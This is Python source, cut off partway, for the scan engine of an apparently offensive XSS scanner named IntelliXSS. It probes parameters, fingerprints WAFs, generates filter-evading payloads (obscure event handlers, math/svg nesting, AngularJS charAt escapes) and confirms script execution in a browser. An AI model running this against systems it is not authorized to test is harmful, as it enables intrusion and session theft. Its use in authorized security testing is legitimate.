"""Main scan orchestrator — adaptive, evidence-driven XSS engine.

Scan loop per parameter
-----------------------
1. **Canary**       inject a unique token, confirm it comes back at all.
2. **Char probe**   measure which characters survive and which get mangled.
3. **Context**      run the HTML5 state machine on the reflection window.
4. **Filters/WAF**  classify the encoding/filtering chain and CSP.
5. **Generate**     context templates + WAF playbook + char-survival pruning.
6. **Verify**       structural evidence, then browser confirmation with the
                    unique marker embedded in every payload (causal proof).
7. **Escalate**     if nothing fires: retry with double-encoded / entity
                    layers, then a WAF-specific profile — only when the
                    diagnosis says a filter is actually in the way.
"""

from __future__ import annotations

import asyncio
import hashlib
import html
import json
import re
import secrets
import time
from typing import List, Optional, Tuple
from urllib.parse import parse_qsl, quote, urlencode, urljoin, urlparse, urlunparse
from colorama import Fore, Style, init as colorama_init

from intellixss.analysis.charprobe import (
    analyze_char_probe,
    analyze_char_probe_at,
    build_probe_string,
    measure_single_char,
    reflect_offset,
    single_char_probe,
)
from intellixss.analysis.context import analyze_marker
from intellixss.analysis.angular import (
    charat_payloads,
    compile_only,
    mark_angular_payload,
)
from intellixss.analysis.filters import analyze_csp, classify_filters, detect_waf
from intellixss.analysis.static_dom import (
    analyze_dom_flows,
    angular_template_finding,
    dom_source_finding,
    fragment_dom_finding,
    source_seed,
)
from intellixss.auth import build_auth_cookies, build_auth_headers, form_login
from intellixss.config import Config
from intellixss.discovery.targets import discover_targets
from intellixss.http.client import HttpClient
from intellixss.models import (
    BlockDiagnosis,
    BlockReason,
    CharProbeResult,
    ContextAnalysis,
    FilterType,
    InjectionContext,
    ProbeOutcome,
    ScanResult,
    ScanTarget,
    XSSFinding,
    mark_of,
)
from intellixss.payloads.generator import generate_payloads, make_marker
from intellixss.payloads.waf_profiles import get_waf_payloads
from intellixss.plugins.graphql_xss import scan_graphql_xss
from intellixss.plugins.header_xss import scan_header_xss
from intellixss.plugins.json_xss import scan_json_xss
from intellixss.plugins.redirect_xss import scan_redirect_xss
from intellixss.plugins.stored_xss import (
    scan_client_stored,
    scan_server_stored,
    scan_stored_auto,
)
from intellixss.plugins.upload_xss import scan_upload_xss
from intellixss.verify.browser import BrowserConfirmer
from intellixss.verify.check import evaluate_response

colorama_init(autoreset=True)

# Fields that behave like stored content when posted.
_STORE_LIKE = {
    "content", "message", "comment", "body", "text", "post", "description", "bio",
}

# Fields whose value drives the request rather than the stored content: sending
# a canary through them invalidates the submission (bad token, unknown record)
# instead of testing whether the value comes back rendered.
_STRUCTURAL_FIELDS = {
    "csrf", "_token", "token", "authenticity_token", "__requestverificationtoken",
    "nonce", "id", "postid", "itemid", "userid", "recordid", "captcha",
}

# Tags whose parsing rules let a *permitted* element open a context where a
# blocked one becomes reachable again. ``<math>`` and ``<svg>`` switch the tree
# builder to a foreign-content mode where ``<mglyph>``/``<style>`` are special,
# so a filter that blocks ``<img>`` but not ``<math>`` is defeated by nesting.
_BREAKOUT_PARENTS = ["math", "svg", "mtext", "mi", "mglyph", "table", "style"]

# Event handlers, in the order they are worth testing. The list is deliberately
# long and includes recently shipped events: filters are written against the
# handlers the author knew about, so the newest ones are the most likely to be
# missing from the blocklist.
# Prefix that makes a rejected value acceptable to a URL-validating field
# while keeping it verbatim for the sink behind that validation.
_URL_SHAPE = "http://ixv.example/{value}"

# Named entities for the delimiters a backslash-escaping app still forwards.
# Measured rather than assumed: ``&apos;`` reaches the handler as a bare quote
# where ``&#39;`` and ``&#x27;`` are dropped outright.
_CHAR_ENTITY = {"'": "&apos;", '"': "&quot;"}

# Values worth re-sending inside a URL when a field rejects them. This is the
# shape a person types into a "Website" box: a character probe, a canary, a
# hostname. A value that already carries markup is not a link mistake — the
# field is rejecting the payload itself — so wrapping it only spends a request.
_INJECTABLE_PROBE = re.compile(r"^[\w.\-/]*$")

# Wall clock for the whole stored pass on one target. The pass drives a browser
# through store probes whose individual steps are bounded, but they run while
# the reflected scan waits for the result lock — so a page that stalls one of
# them stalls the scan. Past this the pass is abandoned and the scan continues.
_STORED_PASS_SECONDS = 180.0

# Wall clock for one browser confirmation. The confirmer carries an internal
# deadline, but only once the coroutine starts; a browser that is already
# wedged (a page that never finishes loading, a transport that stopped
# answering) leaves the caller waiting forever. This is the outer backstop.
_CONFIRM_DEADLINE = 45.0

_EVENT_CANDIDATES = [
    "onfocus", "onmouseover", "onpointerover", "onanimationstart",
    "ontoggle", "onbeforetoggle", "onscrollend", "onanimationiteration",
    "ontransitionend", "onpagereveal", "onsecuritypolicyviolation",
    "oncontentvisibilityautostatechange", "onauxclick", "onclick", "onbegin",
]

# Some handlers are not attributes of an arbitrary element: they fire on an
# *animator* nested inside its container, and only when the animation has a
# target to act on. Declaring them on the container, or on a bare animator
# outside it, leaves dead code that looks exactly like a blocked handler.
# Mapping a container to the children that can run inside it lets the
# allowlist probe the element the browser will actually animate.
_SVG_ANIMATORS = ("animatetransform", "animate")
_NESTED_ANIMATOR_EVENTS = {"onbegin", "onend", "onrepeat"}

# Tag elements that are cheap to probe: no side effects, valid nearly anywhere.
_TAG_CANDIDATES = [
    "xss", "svg", "math", "img", "details", "a", "body", "input", "iframe",
    "video", "audio", "marquee", "object", "template", "animatetransform",
]

# Filters that justify escalating to higher encoding layers.
_ENCODING_FILTERS = {
    FilterType.HTML_ENCODE,
    FilterType.URL_ENCODE,
    FilterType.JS_ENCODE,
    FilterType.STRIP_TAGS,
    FilterType.STRIP_EVENTS,
    FilterType.STRIP_SCRIPT,
    FilterType.BLOCK_ANGLE,
}

# Filters that justify loading a WAF-specific payload profile.
_WAF_FILTERS = {f for f in FilterType if f.value.startswith("waf_")} - {
    FilterType.WAF_GENERIC
}


class Scanner:
    def __init__(self, config: Optional[Config] = None):
        self.config = config or Config()
        self.browser = BrowserConfirmer(self.config, log=self._log)
        self._client_stored_done: set = set()
        # Learned once per scan: which element and which handler this target
        # accepts. Re-probing them for every parameter repeats the same answer.
        self._allowlist_tags: str = ""
        self._allowlist_handler: str = ""
        self._source_dom_done: set = set()
        self._seen_keys: set = set()
        self._mute = False

    # ------------------------------------------------------------------
    # top level
    # ------------------------------------------------------------------

    async def scan(self, target_url: str) -> ScanResult:
        result = ScanResult(target_url=target_url)
        result.stats.started_at = time.monotonic()
        self._log(f"IntelliXSS v3.3 — scanning {target_url}", "title")
        self._log(
            f"workers={self.config.workers}  rate={self.config.rate_limit}/s  "
            f"browser={'on' if self.config.use_browser else 'off'}  "
            f"deep={'on' if self.config.deep else 'off'}  "
            f"aggressive={'on' if self.config.aggressive else 'off'}",
            "info",
        )

        auth_headers, auth_cookies = await self._auth_setup(target_url, result)

        if self.config.use_browser:
            await self.browser.start()

        try:
            async with HttpClient(
                self.config, extra_headers=auth_headers, cookies=auth_cookies
            ) as client:
                status, body, headers, final_url = await client.request("GET", target_url)
                if status < 400 and _is_login_redirect(target_url, final_url):
                    # No credential was configured, but the site answered with
                    # its login form. A sink behind that form is invisible to an
                    # anonymous crawl, so the account named on the form is used
                    # when one was supplied and the session is carried into both
                    # the HTTP client and the browser from here on.
                    if await self._auto_login(client, target_url, final_url, result):
                        status, body, headers, final_url = await client.request(
                            "GET", target_url
                        )
                if status == 0:
                    result.errors.append("Failed to reach target (network error)")
                    result.diagnoses.append(
                        BlockDiagnosis(
                            reason=BlockReason.NETWORK_ERROR,
                            status=0,
                            detail="Initial request failed",
                        )
                    )
                    self._log(f"network error reaching {target_url}", "error")
                    return result

                waf_filters, waf_name, signals = detect_waf(headers, body, status)
                result.waf = waf_name
                csp = analyze_csp(headers)
                if waf_name:
                    self._log(
                        f"WAF fingerprint: {waf_name}  signals={signals}", "warn"
                    )
                    result.diagnoses.append(
                        BlockDiagnosis(
                            reason=BlockReason.NONE,
                            status=status,
                            detail=f"WAF fingerprint: {waf_name}",
                            signals=signals,
                        )
                    )
                if csp and csp.strict:
                    self._log(
                        "CSP is strict — inline script and event handlers will not execute",
                        "warn",
                    )

                targets = await discover_targets(client, target_url, self.config)
                self._log(f"{len(targets)} injectable target(s) discovered", "info")

                sem = asyncio.Semaphore(max(1, self.config.workers))
                lock = asyncio.Lock()

                async def _one(t: ScanTarget) -> None:
                    async with sem:
                        async with lock:
                            result.targets_tested += 1
                        await self._scan_target(client, t, result, waf_filters, lock)

                await asyncio.gather(*[_one(t) for t in targets])

                # Sources the URL cannot drive are invisible to the ladder, so
                # the page is analysed directly for them.
                if self.config.use_browser and self.browser.available:
                    for t in targets[:3]:
                        if t.method.upper() == "GET":
                            await self._scan_source_dom(client, t, result, lock)

                await self._stored_pass(client, target_url, targets, result, lock)
                if self.config.deep:
                    await self._deep_pass(client, target_url, body, result, lock)

                before = len(result.findings)
                result.findings = _dedupe_findings(result.findings)
                if before != len(result.findings):
                    self._log(
                        f"deduped findings: {before} -> {len(result.findings)}", "info"
                    )
        finally:
            await self.browser.stop()
            result.stats.finished_at = time.monotonic()

        confirmed = sum(1 for f in result.findings if f.browser_confirmed)
        self._log(
            f"done — findings={len(result.findings)} "
            f"confirmed={confirmed}/{len(result.findings)} "
            f"targets={result.targets_tested} "
            f"requests={result.stats.requests} "
            f"in {result.stats.duration:.1f}s",
            "title",
        )
        return result

    async def _auth_setup(
        self, target_url: str, result: ScanResult
    ) -> Tuple[dict, dict]:
        auth = self.config.auth
        auth_headers = build_auth_headers(auth)
        auth_cookies = build_auth_cookies(auth)
        if auth.login_url and auth.username:
            h, c, ok, detail = await form_login(
                self.config, auth, target_url, log=self._log
            )
            auth_headers.update(h)
            auth_cookies.update(c)
            if not ok:
                result.errors.append(f"auth_login:{detail}")
        return auth_headers, auth_cookies

    async def _auto_login(
        self,
        client: HttpClient,
        target_url: str,
        login_url: str,
        result: ScanResult,
    ) -> bool:
        """Log in through the form the site redirected us to.

        Two cases reach here. With credentials configured, the login simply
        happens now instead of at the guessed ``login_url``. Without them, the
        form is read for the account it advertises and the session is reused if
        the site accepts it — nothing is sent that the page did not already
        name.

        Returns True only when the page *after* login is no longer the login
        page, so a rejected password is reported rather than scanned as an
        anonymous session.
        """
        auth = self.config.auth
        username = auth.username
        password = auth.password
        if not username:
            return False
        status, page, _hdrs, _final = await client.request("GET", login_url)
        if status >= 400 or not page:
            return False
        fields = _form_fields(page)
        user_field = auth.username_field if auth.username_field in fields else _user_field(fields)
        pass_field = auth.password_field if auth.password_field in fields else _pass_field(fields)
        if not user_field or not pass_field:
            return False
        # Hidden inputs carry the token that proves the form was rendered, so
        # their value is reused verbatim. A blank submission is rejected as a
        # CSRF failure before the password is even looked at.
        data = dict(_hidden_values(page))
        data[user_field] = username
        data[pass_field] = password
        status, _body, _hdrs, after = await client.request("POST", login_url, data=data)
        if status >= 400:
            result.errors.append(f"auto_login:http_{status}")
            return False
        cookies = _jar_cookies(client)
        if _is_login_redirect(target_url, after):
            result.errors.append("auto_login:credentials_rejected")
            return False
        if cookies:
            # The browser gets the same session, otherwise every browser
            # confirmation would be made against the anonymous site and a sink
            # behind the login would be refuted for the wrong reason.
            try:
                self.browser.set_cookies(cookies)
            except Exception:
                pass
        self._log(f"session established at {urlparse(login_url).path}", "info")
        return True

    # ------------------------------------------------------------------
    # stored / deep passes
    # ------------------------------------------------------------------

    async def _stored_pass(
        self,
        client: HttpClient,
        target_url: str,
        targets: List[ScanTarget],
        result: ScanResult,
        lock: asyncio.Lock,
    ) -> None:
        if any(f.vulnerability_type.startswith("stored") for f in result.findings):
            return
        try:
            self._log("stored XSS pass (server + client-side forms)", "info")
            # The stored pass is a side quest. The browser-driven stages carry
            # their own deadlines, but the *whole* pass still runs while the
            # reflected scan is waiting on the lock that collects its findings,
            # so one wedged page is enough to stall the scan. The pass gets a
            # wall clock of its own and is abandoned past it.
            sf = await asyncio.wait_for(
                scan_stored_auto(
                    client,
                    target_url,
                    browser=self.browser,
                    targets=targets,
                    log=self._log,
                ),
                timeout=_STORED_PASS_SECONDS,
            )
            async with lock:
                for f in sf:
                    self._add(result, f)
        except asyncio.TimeoutError:
            self._log(
                f"stored pass exceeded {_STORED_PASS_SECONDS:.0f}s — moving on", "warn"
            )
        except Exception as e:  # never let a plugin kill the scan
            self._log(f"stored plugin error: {e}", "warn")

    async def _deep_pass(
        self,
        client: HttpClient,
        target_url: str,
        body: str,
        result: ScanResult,
        lock: asyncio.Lock,
    ) -> None:
        self._log("deep plugins: header, redirect, JSON, GraphQL, upload", "info")
        plugins = (
            (
                "header",
                scan_header_xss(
                    client,
                    target_url,
                    browser=self.browser,
                    max_payloads=min(8, self.config.max_payloads_per_param),
                    log=self._log,
                ),
            ),
            (
                "redirect",
                scan_redirect_xss(client, target_url, browser=self.browser, log=self._log),
            ),
            (
                "json",
                scan_json_xss(
                    client, target_url, html=body or "", browser=self.browser, log=self._log
                ),
            ),
            (
                "graphql",
                scan_graphql_xss(client, target_url, browser=self.browser, log=self._log),
            ),
            (
                "upload",
                scan_upload_xss(
                    client, target_url, html=body or "", browser=self.browser, log=self._log
                ),
            ),
        )
        for name, coro in plugins:
            try:
                findings = await coro
                async with lock:
                    for f in findings:
                        self._add(result, f)
            except Exception as e:
                self._log(f"{name} plugin error: {e}", "warn")

    # ------------------------------------------------------------------
    # per-target scanning
    # ------------------------------------------------------------------

    async def _scan_target(
        self,
        client: HttpClient,
        target: ScanTarget,
        result: ScanResult,
        baseline_waf: List[FilterType],
        lock: asyncio.Lock,
    ) -> None:
        method = str(target.method).upper()

        if method == "CLIENT":
            await self._scan_client_stored_target(target, result, lock)
            return

        for param in target.params:
            if param in ("#fragment", "fragment", "#"):
                await self._scan_fragment(client, target, result, lock)
                continue

            # Any submitted field can be stored and rendered elsewhere, not just
            # the ones whose name suggests a message body: a "website" field
            # comes back inside ``<a href="…">``. The stored pass is cheap — one
            # canary, one re-render — and it skips itself when nothing persists,
            # so the whole form is offered to it and the reflected pass keeps
            # running as the fallback.
            if method == "POST":
                if await self._scan_server_stored_target(
                    client,
                    target,
                    param,
                    result,
                    lock,
                    form_page=target.source_url or "",
                ):
                    # A *confirmed* stored record is answered. A form-derived
                    # target that persists nothing is still a field, and the
                    # page that renders it may reflect the parameter in its own
                    # query — `/my-account?email=` is exactly that page. So the
                    # reflected pass runs next unless a finding came back.
                    if any(
                        f.parameter == param
                        and f.vulnerability_type.startswith("stored")
                        for f in result.findings
                    ):
                        continue

            await self._scan_param(client, target, param, result, baseline_waf, lock)

    async def _js_url_finding(
        self,
        client: HttpClient,
        target: ScanTarget,
        param: str,
        result: ScanResult,
        lock: asyncio.Lock,
    ) -> bool:
        """Detect a value spliced into the code of a ``javascript:`` URL.

        The parameter is server-side validated (a post id, a numeric key…), so
        the canary never survives long enough to be found in a response. The
        vulnerability does not depend on reflection: the page interpolates the
        accepted value into a ``javascript:`` pseudo-URL, and the browser
        evaluates that code when the element is followed. Detection therefore
        asks for the page's own shape, then reads the rendered document for a
        pseudo-URL that contains the value we sent.
        """
        # Re-request with a value the constraint accepts. A bare digit is the
        # most common shape (numeric id); when the page rejects that too, there
        # is nothing to render and the caller falls through to its diagnosis.
        probe_value = "1"
        _st, body, _hdrs, _fin = await self._inject(client, target, param, probe_value)
        result.stats.requests += 1
        if not body or probe_value not in body:
            return False
        # Locate the pseudo-URL that carries our value. A ``javascript:``
        # attribute is code, so the payload is code; the surrounding quotes
        # decide which quote has to be broken first.
        found = None
        for m in re.finditer(r"""(?is)(href|src|action|formaction)\s*=\s*(["'])""", body):
            attr_quote = m.group(2)
            close = body.find(attr_quote, m.end())
            if close < 0:
                continue
            value = body[m.end():close]
            if not value.lstrip().lower().startswith("javascript:"):
                continue
            if probe_value not in value:
                continue
            found = (m.group(1).lower(), attr_quote, value)
            break
        if not found:
            return False
        attr_name, _attr_quote, value = found

        marker = make_marker(hashlib.md5(param.encode()).hexdigest()[:8])
        # Which string literal is open where our value sits decides the breakout.
        js_quote = _js_string_open_at(value, probe_value)
        # The id the page already accepted becomes the payload's own prefix, so
        # the filter sees the shape it expects.
        payload = _js_url_payload(marker, js_quote, prefix=probe_value)

        ctx_enum = (
            InjectionContext.JS_STRING_SINGLE
            if js_quote == "'"
            else InjectionContext.JS_STRING_DOUBLE
            if js_quote == '"'
            else InjectionContext.JS_CODE
        )
        # A payload that carries its own percent-escapes (a ``javascript:``
        # breakout must keep ``%27``, ``%2b`` and ``%3E`` literal) has to reach
        # the wire byte for byte. Quoting it would turn ``%27`` into ``%2527``
        # and the target would receive a different string than the one built.
        finding = XSSFinding(
            url=_swap_query_param(target.url, param, payload, raw=True),
            parameter=param,
            method="GET",
            context=ctx_enum,
            payload=payload,
            evidence=(
                f"value is spliced into a javascript: URL on <{attr_name}> "
                f"({js_quote or 'code'} context); the browser evaluates it on "
                f"navigation, so the payload escapes the string and calls alert"
            ),
            browser_confirmed=False,
            impact="high",
            vulnerability_type="dom",
            confidence=0.85,
            marker=marker,
            payload_candidates=[payload],
        )
        await self._confirm_with_browser(
            finding, ContextAnalysis(context=ctx_enum, confidence=0.8)
        )
        if not finding.browser_confirmed:
            # Following a javascript: URL needs a user action the confirmer
            # cannot fabricate for every element, so an unclicked payload is
            # still a real splice.
            finding.evidence += " | javascript_url_sink"
            finding.verified_by = "static"
            finding.confidence = min(finding.confidence, 0.7)
        async with lock:
            self._add(result, finding)
            self._report_finding(finding, ContextAnalysis(context=ctx_enum))
        self._log(
            f"js_url {param}  value reaches a javascript: URL on <{attr_name}>", "info"
        )
        return True

    async def _page_scripts(
        self, client: HttpClient, body: str, page_url: str
    ) -> List[str]:
        """Fetch the page's own same-origin ``<script src=…>`` bodies.

        Sinks live in bundles, not in the document: a page can name a search
        script whose ``innerHTML`` assignment is the whole vulnerability. The
        bodies are cached per scan because several parameters look at the same
        document, and a third-party host is never fetched — its script cannot
        be the sink of a parameter the page itself controls.
        """
        cache = getattr(self, "_script_cache", None)
        if cache is None:
            cache = self._script_cache = {}
        out: List[str] = []
        for m in re.finditer(
            r"""<script\b[^>]*\bsrc\s*=\s*["']([^"']+)["']""", body or "", re.I
        ):
            src = urljoin(page_url, m.group(1))
            if urlparse(src).netloc != urlparse(page_url).netloc:
                continue
            if src in cache:
                if cache[src]:
                    out.append(cache[src])
                continue
            try:
                st, text, _, _ = await client.request("GET", src)
            except Exception:
                cache[src] = ""
                continue
            cache[src] = text if (st and text) else ""
            if cache[src]:
                out.append(cache[src])
        return out

    async def _dom_flow_finding(
        self,
        client: HttpClient,
        target: ScanTarget,
        param: str,
        body: str,
        result: ScanResult,
        lock: asyncio.Lock,
    ) -> bool:
        """Report DOM XSS when *param* reaches a sink through page script.

        Only fires for a flow whose source is a URL parameter that this
        parameter actually is — a page reading ``location.search`` for
        ``?search=`` proves nothing about ``?q=``. The finding is confirmed in
        the browser by loading the page with the payload in the parameter,
        which is exactly how an attacker would deliver it.
        """
        if not (self.config.use_browser and self.browser.available):
            return False
        external = await self._page_scripts(client, body, target.url)
        flows = analyze_dom_flows(body, external)
        search_flows = [f for f in flows if f[0] == "location.search"]
        if not search_flows:
            return False
        # The script decides which query key it reads; if it names one, the
        # flow only applies to that key.
        script_src = body + "\n" + "\n".join(external)
        keys = set(re.findall(r"""\.get\(\s*['"]([^'"]+)['"]""", script_src))
        script_src_keys = set(re.findall(r"""\.get\(\s*['"]([^'"]+)['"]""", body))
        if (keys or script_src_keys) and param not in (keys | script_src_keys):
            self._log(
                f"dom    {param}: page reads {sorted(keys | script_src_keys)}, not this key",
                "debug",
            )
            return False

        marker = make_marker(hashlib.md5(param.encode()).hexdigest()[:8])
        finding = fragment_dom_finding(target.url, body, marker=marker, external_js=external)
        if not finding:
            return False

        # The fragment variant is built for a "#..." delivery; this parameter
        # is delivered in the query string, so rebuild the URL around it.
        payload = finding.payload
        base = target.url.split("#")[0]
        finding.url = _swap_query_param(base, param, payload)
        finding.parameter = param
        finding.context = InjectionContext.HTML_TEXT
        finding.evidence = (
            f"DOM taint: location.search[{param}] reaches sink(s) "
            f"{sorted({s for _, s, _ in search_flows})}; {finding.evidence.split('; ', 1)[-1]}"
        )

        await self._confirm_with_browser(finding, ContextAnalysis(context=InjectionContext.HTML_TEXT))
        if not finding.browser_confirmed:
            finding.evidence += " | static_dom_only"
            finding.verified_by = "static"
            finding.confidence = min(finding.confidence, 0.8)
        async with lock:
            self._add(result, finding)
            self._report_finding(finding, ContextAnalysis(context=InjectionContext.HTML_TEXT))
        return True

    async def _scan_href_context(
        self,
        client: HttpClient,
        target: ScanTarget,
        param: str,
        result: ScanResult,
        lock: asyncio.Lock,
    ) -> bool:
        """Prove a URL-attribute injection the scheme ladder cannot.

        A value spliced into ``href`` / ``src`` is normally hijacked by changing
        its scheme to ``javascript:``. That only runs once the element is
        activated, and a canonical link, a preload or a stylesheet is never
        clicked. The attribute is still a quoted attribute on a real element,
        so the value can leave the URL grammar entirely and declare a handler
        on that element instead. The technique is assembled here rather than
        ranked in the ladder because it succeeds or fails as a whole: half of
        it (a shortcut with a broken call) is inert, so a partial payload must
        not be reported as the finding.
        """
        if not self.config.use_browser or not self.browser.available:
            return False
        # The page is analysed with a known value in the parameter, not with
        # whatever the target URL happens to carry: a seed without a query
        # string (``/`` plus a guessed name) reflects nothing, and the context
        # of the attribute the value lands in is the whole premise of this
        # route.
        canary = "ixhcanary9"
        st, body, _hdrs, final = await self._inject(client, target, param, canary)
        async with lock:
            result.stats.requests += 1
        if not st or not body or canary not in body:
            return False
        if not (self.config.use_browser and self.browser.available):
            # Nothing to prove it with. Adding it anyway would put an
            # unverified lead in the report for every ``href`` parameter.
            return False
        hit = analyze_marker(body, canary)
        ctx = hit.context
        if ctx not in (
            InjectionContext.HTML_ATTR_HREF,
            InjectionContext.HTML_ATTR_SINGLE,
            InjectionContext.HTML_ATTR_DOUBLE,
        ):
            return False
        quote = hit.quote_char or (
            "'" if ctx == InjectionContext.HTML_ATTR_SINGLE else '"'
        )
        marker = make_marker(secrets.token_hex(4))
        payloads = _attribute_shortcut_payloads(marker, quote)
        for payload in payloads:
            # The assembled payload must reach the page verbatim: a handler
            # whose quotes were rewritten is a different, inert string.
            st2, body2, hdrs2, final2 = await self._inject(
                client, target, param, payload
            )
            async with lock:
                result.stats.requests += 1
                result.stats.payloads_sent += 1
            if not st2 or payload not in (body2 or ""):
                continue
            finding = XSSFinding(
                url=final2 or target.url,
                parameter=param,
                method=target.method,
                context=ctx,
                payload=payload,
                evidence="attribute_shortcut: handler declared on the element",
                vulnerability_type="reflected",
                confidence=0.8,
            )
            finding.marker = marker
            finding.verified_by = "reflection"
            await self._confirm_with_browser(
                finding, ContextAnalysis(context=ctx), marker=marker
            )
            if not finding.browser_confirmed:
                continue
            async with lock:
                added = self._add(result, finding)
                if added:
                    self._report_finding(finding, ctx)
            if added:
                return True
        return False

    async def _scan_source_dom(
        self,
        client: HttpClient,
        target: ScanTarget,
        result: ScanResult,
        lock: asyncio.Lock,
    ) -> None:
        """DOM XSS whose source is a browser-owned value (referrer/name/cookie).

        A page like ``eval(document.referrer)`` is invisible to parameter
        scanning: no query drives it. Fetch the document once, and if a seedable
        source reaches a sink, prove it by planting the payload in the browser.
        """
        key = target.url.split("#")[0]
        async with lock:
            if key in self._source_dom_done:
                return
            self._source_dom_done.add(key)

        status, body, _hdrs, final = await client.request("GET", target.url)
        async with lock:
            result.stats.requests += 1
        if not status or not body:
            return

        finding = dom_source_finding(
            final or target.url, body, marker=make_marker(str(id(target))[-8:])
        )
        if not finding:
            return
        self._log(
            f"dom-src  {finding.parameter} -> {finding.payload[:40]!r}", "info"
        )

        ctx = ContextAnalysis(
            context=InjectionContext.URL_FRAGMENT,
            confidence=0.75,
            char_probe=None,
        )
        await self._confirm_with_browser(finding, ctx, marker=finding.marker)
        async with lock:
            self._add(result, finding)

    async def _scan_client_stored_target(
        self, target: ScanTarget, result: ScanResult, lock: asyncio.Lock
    ) -> None:
        key = target.url.split("#")[0]
        async with lock:
            if key in self._client_stored_done:
                return
            self._client_stored_done.add(key)
        if not self.browser.available:
            self._log(f"stored-client skip {target.url[:60]} — browser off", "debug")
            return
        findings = await scan_client_stored(self.browser, target.url, log=self._log)
        async with lock:
            for f in findings:
                self._add(result, f)

    async def _scan_server_stored_target(
        self,
        client: HttpClient,
        target: ScanTarget,
        param: str,
        result: ScanResult,
        lock: asyncio.Lock,
        form_page: str = "",
    ) -> bool:
        # Structural fields gate the submission itself: overwriting the CSRF
        # token or the record id makes every request on this form fail, so the
        # stored pass on them says nothing about storage.
        if param.lower() in _STRUCTURAL_FIELDS:
            return False
        # A stored record is written *through* the handler and shown on the page
        # that carries the form. Which of the two is which cannot be assumed from
        # the action alone — a handler can share its path with its page and still
        # answer on a sub-path — so the page goes in the candidate list too. The
        # plugin fetches the form, recognises an in-place action from that markup,
        # and stops re-reading a record's own page.
        render = [target.source_url or target.url]
        if form_page and form_page not in render:
            render.append(form_page)
        findings = await scan_server_stored(
            client,
            target.url,
            field=param,
            method="POST",
            base_data=target.data,
            render_urls=render,
            browser=self.browser,
            max_payloads=min(6, self.config.max_payloads_per_param),
            log=self._log,
        )
        async with lock:
            for f in findings:
                # The stored pass writes through this form, so the record it
                # posted is what a reader needs to replay it.
                if target.data and not f.request_body:
                    f.request_body = dict(target.data)
                self._add(result, f)
        return bool(findings)

    # ------------------------------------------------------------------
    # the main engine
    # ------------------------------------------------------------------

    async def _scan_param(
        self,
        client: HttpClient,
        target: ScanTarget,
        param: str,
        result: ScanResult,
        baseline_waf: List[FilterType],
        lock: asyncio.Lock,
    ) -> None:
        uid = _uid(f"{target.url}{param}{time.time()}")

        # 1) Canary — is this parameter reflected at all?
        canary = f"ixc{uid}"
        st, body, hdrs, final_url = await self._inject(client, target, param, canary)
        result.stats.requests += 1
        # Kept before the reflection gate: a parameter can be dead as markup
        # and alive as a DOM source, and which one applies is decided below.
        response_body = body
        if st == 0:
            async with lock:
                result.diagnoses.append(
                    BlockDiagnosis(
                        reason=BlockReason.NETWORK_ERROR,
                        detail=f"inject failed {target.url}?{param}",
                    )
                )
            return
        if not _contains(body, canary):
            if st >= 400:
                # A parameter that is validated as a number, an id or a slug
                # rejects a canary outright, yet the page may still splice *any*
                # accepted value into executable code. Re-request with the shape
                # the page itself already accepted so the rendered document can
                # be analysed for a script sink before the parameter is written off.
                js_url = await self._js_url_finding(
                    client, target, param, result, lock
                )
                if js_url:
                    return
                _, diag = classify_filters(body, canary, hdrs, st, canary)
                diag.detail = f"param={param} {diag.detail}"
                async with lock:
                    result.diagnoses.append(diag)
                self._log(
                    f"block  {param}  status={st}  {diag.reason.value}", "warn"
                )
            else:
                self._log(f"no reflection  {param}", "debug")
            dom = await self._dom_flow_finding(
                client, target, param, response_body, result, lock
            )
            if dom:
                self._log(f"dom    {param}  parameter reaches a sink via script", "info")
            return

        # 2) Character survival probe
        result.stats.reflections += 1
        probe = build_probe_string(uid)
        st_p, body_p, hdrs_p, _ = await self._inject(client, target, param, probe)
        result.stats.requests += 1
        char_probe = analyze_char_probe(param, uid, body_p or "")

        # 3) Context (HTML5 state machine over the reflection)
        hit = analyze_marker(body, canary)
        context = hit.context

        # 3b) Re-measure survival at the reflection we will actually attack.
        # One stacked probe cannot describe a parameter echoed in two places:
        # a metacharacter that survives in the attribute closes it, and the
        # stacked region stops being locatable. Measure the delimiter and the
        # break-out characters one request each, at the chosen offset.
        if body_p and hit.chosen_pos >= 0:
            verdicts = await self._measure_chars_at(
                client, target, param, uid, body, body_p, canary, probe, hit, result
            )
            if verdicts:
                char_probe = _merge_char_probe(char_probe, param, verdicts)

        ctx = ContextAnalysis(
            context=context,
            char_probe=char_probe,
            confidence=hit.confidence,
            quote_char=hit.payload_quote,
            tag_name=hit.tag_name,
            attr_name=hit.attr_name,
            csp=analyze_csp(hdrs_p or hdrs),
            notes=list(hit.notes),
        )

        # 4) Filters
        filters, diag = classify_filters(
            body_p or body, canary, hdrs_p or hdrs, st_p, probe
        )
        for f in baseline_waf:
            if f not in filters:
                filters.append(f)
        ctx.filters = filters
        ctx.reflection_snippet = _snippet(body_p or body, canary)

        self._log(
            f"reflect  {param}  ctx={context.label}  "
            f"filters={','.join(f.label for f in filters)}"
            + (f"  waf={ctx.csp and 'csp-strict' or ''}" if ctx.csp else ""),
            "info",
        )
        if self.config.verbose:
            self._log(
                f"chars allowed={''.join(sorted(char_probe.allowed_chars))!r} "
                f"blocked={''.join(sorted(char_probe.blocked_chars))!r}",
                "debug",
            )

        # 5) AngularJS template injection: the payload is compiled by ng-app,
        # not by the HTML parser, so the ordinary markup ladder never fires.
        # The expression is driven through the browser like any other DOM flow —
        # a compiler running the payload is observable as a dialog — and only
        # stays static when nothing executed.
        #
        # The *canary* body is used, not the probe body: the survival probe
        # carries markup characters that these apps reject outright, so it
        # comes back as an error page and the compiler is invisible there.
        ng = angular_template_finding(
            final_url or target.url,
            body,
            marker=make_marker(uid),
            parameter=param,
            headers=hdrs,
        )
        if ng:
            await self._confirm_with_browser(ng, ctx)
            if not ng.browser_confirmed and ng.payload_candidates:
                # Every direct-escape family was refused. The one construction
                # left is the pre-1.6 ``charAt`` overwrite, which runs its own
                # JavaScript after the rewriter has already been fooled — and is
                # the only family that still reaches ``window`` on an app that
                # undefined ``$eval`` and quotes its input.
                #
                # Skipped entirely when the page only *compiles*: an escape can
                # change what the parser emits, but nothing here calls the
                # result, so every statement family is dead on arrival and the
                # request budget is better spent saying so.
                if compile_only(body):
                    ng.notes.append(
                        "angular compile-only sink: $parse compiles the value "
                        "but the result is interpolated, never executed "
                        "(1+1 renders literally; {{…}} stays literal)"
                    )
                    self._log(
                        f"angular  {param}  compile-only sink, no execution path",
                        "info",
                    )
                else:
                    extra = [
                        mark_angular_payload(p, ng.marker) for p, _ in charat_payloads()
                    ]
                    ng.payload_candidates = extra + list(ng.payload_candidates)
                    await self._confirm_with_browser(ng, ctx)
            if ng.browser_confirmed:
